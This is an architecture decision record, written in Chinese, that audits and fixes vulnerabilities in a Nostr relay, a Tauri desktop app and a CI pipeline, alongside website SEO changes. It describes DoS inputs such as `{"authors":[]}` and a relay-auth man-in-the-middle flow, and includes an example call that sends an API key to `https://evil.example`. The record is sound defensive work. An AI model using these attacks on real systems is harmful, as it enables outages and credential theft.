# 0235. 對外面向資安加固與官網 SEO／GEO 重整

- 狀態：已接受
- 日期：2026-07-22
- 相關文件：`ARCHITECTURE.md` §2／§5／§8、`PRD.md` §6–§8、ADR-0057（NIP-42）、ADR-0059（DO 休眠）、
  ADR-0060／0062（LLM 改寫）、ADR-0090（官網）、ADR-0119（濫用防護）、ADR-0123（具名訂閱）、
  ADR-0186（GitHub Pages 部署）、ADR-0228（更新偵測）、ADR-0231（威脅情報）

## 背景與問題

對「所有對外的部分」做了一輪完整審查：中繼站（Cloudflare Worker／Node 自架）、Tauri 原生橋、
官網、CI／排程 workflow、以及客戶端解析遠端資料的路徑。發現的問題可歸為四類。

### 一、中繼站可被單一客戶端打掉

1. **（C1）畸形事件導致 Durable Object 崩潰。** `verifyEvent` 只保證「id 是這串 JSON 的雜湊、
   sig 對得上」，**完全不檢查欄位型別**。攻擊者可自行對 `tags` 為物件／字串／null 的結構算
   雜湊並簽名，驗簽會通過；隨後 `event.tags.find(...)` 拋 `TypeError`。Worker 的
   `webSocketMessage` 沒有 try/catch，DO 的未捕捉例外會中止整個實例——而這是**單一全域房間**
   （`idFromName("global")`），等於全站連線一起斷。成本：產一把金鑰、送一則訊息、無限重複。

2. **（C2）`authors`-only 訂閱造成全表掃描。** `scoped()` 明文允許「無 `#p`、有 `authors`」的
   訂閱（ADR-0071 快照查詢正是此形狀），連 `authors: []` 都放行。而 `SqlMessageStore.query()`
   在無 `#p` 時執行 `SELECT json FROM offline_msgs WHERE expiration > ?`——**整張表**撈進記憶體、
   逐筆 `JSON.parse`，再於 JS 端過濾。`{"authors":[]}` 是零收穫、全代價的 payload；DO 記憶體
   上限 128MB，重複送幾次就 OOM。

3. **（C3）寫入放大。** `recipientsOf` 回傳所有 `p` tag，每個收件人各 INSERT 一列並各跑一次
   `enforceCap`。大小檢查**只有 kind 1060 有**，其餘 kind 完全無界：一則 1MB 事件可塞約
   15,000 個 `p` tag ＝ 15,000 次 INSERT ＋ 15,000 輪 SELECT/DELETE。

4. **（H1）防護實作了但沒啟用。** `relay-core` 早有 `maxClockSkewSec`／`maxSubscriptions`，
   但產線 `worker.ts` 只設了後者——`seenIds` 因此永遠是空的，**零重放防護**。
   per-pubkey 速率限制則是從頭到尾不存在（`ARCHITECTURE.md` §5 宣稱有）。

5. **（H2）NIP-42 未驗 `relay` tag。** 只比對 challenge 相符擋不住中間人轉發：惡意中繼 M 連上
   真中繼 R 取得挑戰 C → 把 C 當成自己的挑戰丟給受害者 → 受害者簽名回給 M → M 轉交 R →
   **以受害者身分通過 R 的認證**，進而訂閱其加密收件匣。內容雖仍是密文，但「誰在何時收到
   幾則」已是完整的流量分析輸入，而 Gift Wrap 的全部意義就是不讓任何人取得這個。

6. **（M1）`limit` 完全未實作**，客戶端要不到就是全部。

### 二、桌面端：權限最高卻防護最少

7. **（C4）`"csp": null`。** web 版（`public/_headers`）有一份寫得不錯的 CSP，但 Tauri 桌面端
   **完全沒有**——而它才是握著整個原生橋的那一端：`key_get` 直接回傳 nsec 明文、`store_load`
   回傳解密後的全量狀態，且 Tauri v2 的 app-local commands **不受** `capabilities/*.json` 管轄。
   webview 一旦有任何 XSS ＝ 私鑰外洩。

8. **（H3）`ai_generate` 會把 API key 送到任意端點。** `check_endpoint` 只驗 scheme 是 http/https，
   **不驗主機**；provider 為 `openai` 時無條件 `.bearer_auth(key)`。
   `ai_generate("openai", "https://evil.example", …)` ＝ 對方同時拿到 API key 與訊息明文。
   前端的 `ensureAllowed` localhost 硬守則是 JS 層，XSS 繞得過。

9. **（H4）切到線上 provider 時自動解除隱私守則。** `switchProvider` 會順手把 `localOnly`
   設成 `false`——系統替使用者解除了「明文不離開裝置」（`ARCHITECTURE.md` §1），
   而使用者從未明示同意。

### 三、供應鏈

10. **（C5）信任根私鑰在 CI。** `MAINTAINER_NSEC` 是客戶端釘死的簽章清單信任根，放在公開 repo
    的排程 workflow；所有 action 用可變 tag（`dtolnay/rust-toolchain@stable` 甚至是分支）。
    外流＝攻擊者可簽發假 relay 清單，把全體客戶端的中繼池導向自己的節點。

11. **（H5）threat-intel 可被上游污染。** `--check` **只驗格式、不驗內容**，客戶端
    `refreshThreatDb` 也完全不驗簽（對比 `funds.json` 有釘死公鑰驗簽）。上游被投毒或誤報
    → 全體使用者的連結被遮罩，嚴格模式下更會**阻止送出**＝一條經由第三方的審查／DoS 通道。

12. **（M2）CI 缺 `permissions`、無任何相依掃描。**

13. **（M3）透明度頁用開發佔位金鑰**簽了示範資料。頁面目前下架故風險受控，但沒有任何機制
    防止「某天接回去、卻忘了換金鑰」。

### 四、官網 SEO／GEO

14. **（SEO-1）整站只有一個 URL。** 四個「頁面」靠 `useState` 切換，導覽是 `<button onClick>`
    ——對爬蟲是**死路**，`tech`／`node`／`roadmap` 等於不存在於索引中。

15. **（SEO-2）純 CSR。** Googlebot 會執行 JS（有佇列延遲與預算），但 **GPTBot／ClaudeBot／
    PerplexityBot 的索引路徑基本上不執行 JS**——它們看到的是一個空的 `<div id="root">`。
    Cinderous 的所有主張對答案引擎**完全不存在**。

16. **（SEO-3）雙語共用同一個 URL**，無 hreflang → 英文內容完全無法被索引。

17. **（SEO-4／5）缺 canonical／OG／Twitter Card／JSON-LD／robots／sitemap／OG 圖**；
    `<h1>` 就只有 `"Cinderous"`，而整個 hero 都是意象——**全站沒有一句話直接說出這是什麼產品**。

18. **（SEO-6）部署在 `github.io` 子路徑**，且 `update-check.ts`／`threat-db.ts` 各自硬寫了一份
    網域——換域時漏改任一處，該功能就永遠指向舊網址（已安裝的舊版更是改不了）。

## 考量的選項

- **選項 A：只修最嚴重的幾項（C1–C4）。** 成本最低，但 C5／H5 的供應鏈風險與整組 SEO 問題會
  持續累積；SEO 每拖一天就少一天的索引齡。
- **選項 B：全部修，SEO 改用框架（Astro／Next）重寫官網。** 效果最好，但等於重寫一個已經
  在跑的站，且與 ADR-0090「純靜態站」的定位衝突。
- **選項 C：全部修，SEO 以「路由 ＋ 建置時預渲染」就地升級。** 保留現有 React 元件與
  `vite build` 產物，只加一層 SSG。

## 決策

採**選項 C**，並依風險順序逐項修正。

### 中繼站

- **C1**：`parseClientMessage` 加事件結構驗證（`isValidEventShape`／`isValidFilterShape`），
  **在 `verifyEvent` 之前**擋掉非法形狀；`RelayCore.handle` 整段包例外圍籬回 `NOTICE`
  ——圍籬放在**傳輸無關核心的唯一入口**，Cloudflare 與 Node 兩個宿主自動受保護。
- **C2**：`query()` 把 `#p`／`authors`／`ids`／`kinds`／`since`／`until` 全部下推 SQL（新增
  `pubkey`／`kind` 欄與索引、含既有資料回填遷移），並一律帶 `LIMIT`（`MAX_QUERY_ROWS = 1024`，
  尊重且夾住 `filter.limit`）。記憶體版 `MessageStore` 同步有界，兩個實作行為一致。
- **C3**：全域事件大小上限 256KB（對齊 `ADDRESSABLE_MAX_BYTES`＝協定內最大合法事件）、
  tag 總數 128、`p` tag 16、原始訊息 384KB（在 `JSON.parse` 之前檢查，最便宜的一道閘）。
- **H1**：per-pubkey 固定窗速率限制（產線 120/分）；時鐘窗改為**非對稱**
  （未來 15 分、過去 `TIMESTAMP_JITTER_SECONDS + 1h`）；重放去重窗獨立為 1 小時。
  **並在 `worker.ts` 與 `node-relay.ts` 實際啟用**。
- **H2**：`connect(connId, relayHost)` 由宿主帶入本次請求的主機，AUTH 驗證 `relay` tag 指向本站
  ＋事件新鮮度（600 秒）；`relayHost` 一併進 `ConnSnapshot`，DO 休眠喚醒後檢查不失效。
- **M1**：`filter.limit` 由 `queryLimit()` 實作。

### 桌面端

- **C4**：`tauri.conf.json` 設定完整 CSP（`script-src 'self'` 無 unsafe-inline、`img-src` 不放行
  遠端主機、`object-src`/`base-uri`/`frame-ancestors` 收斂），另設 `devCsp` 放行 HMR。
  加 `tauri-csp.test.ts` 防回歸。
- **H3**：API key **綁定端點主機**（`ai:<provider>:<host>`）。換端點＝查不到 key ＝金鑰根本不會
  從金鑰庫被讀出來。純函式移入 lib（`aikey.rs`）以進入 `cargo test` 預設編譯範圍。
  舊版無主機金鑰只在端點正是該 provider **官方主機**時沿用。
- **H4**：`switchProvider` 不再自動關閉 `localOnly`。

### 供應鏈

- **C5／M2**：所有 action 釘 commit SHA；全部 `pnpm install` 加 `--ignore-scripts`；
  `ci.yml` 加 `permissions: contents: read`、新增 `pnpm audit` ＋ `cargo audit` ＋ `cargo clippy`。
- **H5**：`threat-snapshot.mjs` 加「絕不封鎖清單」（apex 精確比對 ＋ 自家基礎設施含子網域）
  與「單次變動量 ≤50%」護欄，並讓 `--check` **驗內容**而非只驗格式。
- **M3**：`funds.test.ts` 加絆線——透明度頁一旦接回 App，佔位金鑰與佔位資料立刻讓測試變紅。

### 官網

- **SEO-1／3**：新增 `routes.ts`（純函式），每個 (頁面 × 語言) 都有真實 URL；預設語言走根路徑
  （不產生 `/zh-Hant/` 重複內容），英文走 `/en/` 前綴。導覽與語言切換一律改為 `<a href>`，
  `onClick` 只作為加速（保留 Ctrl／中鍵等原生行為）。
- **SEO-2**：`entry-server.tsx` ＋ `scripts/prerender.mjs`，`vite build` 後對每條路由渲染成
  **實體目錄下的 index.html**（而非 SPA fallback）——GitHub Pages 直接服務，爬蟲拿到 200。
  客戶端改 `hydrateRoot`。
- **SEO-4**：`seo.ts` 產出每頁專屬 title／description／canonical／hreflang（含 x-default）／
  OG／Twitter Card／JSON-LD（`WebSite`＋`WebPage`，首頁加 `SoftwareApplication`），
  並生成 `robots.txt`（明確允許 GPTBot／ClaudeBot／PerplexityBot）與 `sitemap.xml`。
  `scripts/og-image.mjs` 以零相依方式產出 1200×630 OG 圖。
- **SEO-5**：`<h1>` 加入平述句（`hero_h1_tagline`），詩意留給 subtitle。
- **SEO-6**：桌面端網域收斂到 `apps/desktop/src/site.ts` 單一來源。

## 理由

- **圍籬與上限放在「唯一入口」而非各宿主**：`RelayCore` 是傳輸無關核心，宿主各自 try/catch
  只會漏掉其中一邊，而 DO 的未捕捉例外代價是全站斷線。
- **「訂閱必須具名」留在 `scoped()`、不下放到儲存層**：儲存層若也擋，「Ephemeral 不入庫」
  那類**否定斷言**會變成恆真的空轉測試。儲存層只保證一件事——**任何查詢的代價都有界**。
- **時鐘窗必須非對稱**：NIP-59 刻意把外層 `created_at` 往前推最多 2 天以免中繼從時序關聯出
  社交圖譜。對稱窗會擋掉幾乎每一則 Gift Wrap——這是「安全設定打死隱私設計」的典型陷阱。
- **重放去重窗不涵蓋整個過去窗**：那是 2 天份的 event id，DO 記憶體撐不住；對封裝事件也沒必要
  （收件端本來就以 `rumor.id` 去重）。真正要擋的是裸心跳被重放來偽造「某人在線」。
- **API key 綁主機而非白名單**：白名單會擋掉 OpenRouter／Groq／LM Studio 等合法的 OpenAI 相容
  服務。綁主機既不限制選擇，又讓「換端點」自動失去金鑰。
- **預渲染而非換框架**：官網的價值在內容與元件，不在框架。加一層 SSG 就取得 GEO 的全部效益，
  而 ADR-0090 的「純靜態站、與通訊平面硬隔離」定位完全不變。
- **PoW 刻意不啟用**：`minPowDifficulty` 早已實作，但**客戶端沒有任何挖礦程式碼**——啟用等於
  讓所有現有安裝立刻無法發訊息。它留作企業自架站的選項。

## 後果

- 正面：
  - 單一畸形事件打掉全站、單一 REQ 撐爆 DO、單一事件放大 15,000 倍寫入——三條路都關上了。
  - 中繼有了真正的速率限制與重放防護（而非「有實作沒啟用」）。
  - NIP-42 中間人轉發攻擊被擋下。
  - 桌面 webview 有了 CSP；AI API key 不再可能被送到任意主機。
  - CI 供應鏈從「可變 tag ＋ 放任 install 腳本」收斂為「釘 SHA ＋ 不執行腳本 ＋ 最小權限」。
  - 官網從 1 個 URL 變成 8 個可索引的 URL，且**不執行 JS 也看得到完整內容**。
- 負面 / 已知殘餘風險：
  - **AUTH 的 `relay` tag 現在是硬性檢查**。第三方 Nostr 客戶端若未依 NIP-42 送出正確的
    `relay` tag，會被拒絕認證。自家客戶端一律有送（`buildAuthEvent`）。
  - **速率限制在 DO 休眠後會重置**（固定窗、記憶體狀態）。它仍然把「單次爆量」壓在上限內
    ——那正是要防的東西——但無法防長時間的低速滋擾。
  - **threat-intel 仍未簽章**：目前的防護是「絕不封鎖清單 ＋ 變動量護欄」，能擋住投毒與格式
    崩壞，但不能證明 snapshot 出自我們。
  - **`MAINTAINER_NSEC` 仍在 CI**：已把 secret 限縮到單一步驟、釘死 action、關掉 install 腳本，
    但 `bootstrap:run` 依然在 runner 上執行整棵相依樹的程式碼。
  - 官網 build 多了兩步（SSR bundle ＋ 預渲染），時間增加約 0.2 秒。
  - `hero_h1_tagline` 是**可見的文案變更**（首頁字標下方多一行說明句）。
- 後續行動 / 待辦：
  1. **把 relay 清單簽章移出 CI，改離線簽發**——這把鑰匙的價值遠高於自動化的便利。
  2. **threat-intel snapshot 比照 `funds.json` 簽章**，客戶端釘死公鑰驗簽後才採用。
  3. **綁自訂網域**（`cinderous.propfolk.com`）：`github.io` 子路徑的網域權重不屬於自己，
     也無法設定安全標頭。要改的四個點見 `apps/desktop/src/site.ts` 的註解。
  4. 透明度頁上線前，換成專屬離線金鑰並重簽 `funds.json`（絆線測試會提醒）。
  5. 評估 relay 的連線數上限（目前只有每連線訂閱數與每 pubkey 事件速率）。
  6. **升級 vite 5→6、vitest 2→3**。新增 audit 時發現 5 個既有弱點（2 critical、1 high、
     2 moderate），**全部在開發工具鏈**（vite dev server 路徑穿越／`server.fs.deny` 繞過、
     vitest UI 任意檔案讀取執行、esbuild dev server），不隨產品出貨；`pnpm audit --prod`
     為零。故 CI 把「出貨相依」設為硬閘（`--prod --audit-level low`），開發工具鏈只報告
     不擋——一盞永遠亮著的紅燈等於沒有燈。升級是跨主版本，另案處理。
